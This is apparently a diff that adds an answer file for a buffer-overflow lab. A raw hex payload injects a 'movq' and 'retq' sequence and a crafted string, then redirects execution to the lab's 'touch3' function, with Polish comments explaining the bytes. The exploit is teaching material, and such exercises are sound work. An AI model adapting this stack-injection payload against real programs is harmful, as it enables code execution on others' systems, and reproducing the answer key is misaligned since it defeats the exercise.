@@ -1,0 +1,7 @@
+00 00 00 40 1B 63 BF 00 00 00 00 00 00 00 00 C3 56 57 58 59 50 51 52 53 54 55 56 57 58 59 50 51 52 53 54 55 56 57 58 59 50 51 52 53 54 55 56 57 BF AE E5 A3 71 C3 00 00 60 26 64 55 00 00 00 00 3E 1C 40 00 00 00 00 00 00 00 00 00 37 31 61 33 65 35 61 65 00 00 00 00 BF 54 26 64 55 C3
+/* 55 64 26 60 - adres poniższej instrukcji:
+BF 54 26 64 55 == movq $0x55642654,%rdi # wskaźnik na napis
+C3 == retq
+37 31 61 33 65 35 61 65 - odpowiednio spreparowany napis (argument touch3)
+40 1C 3E - adres touch3
+*/
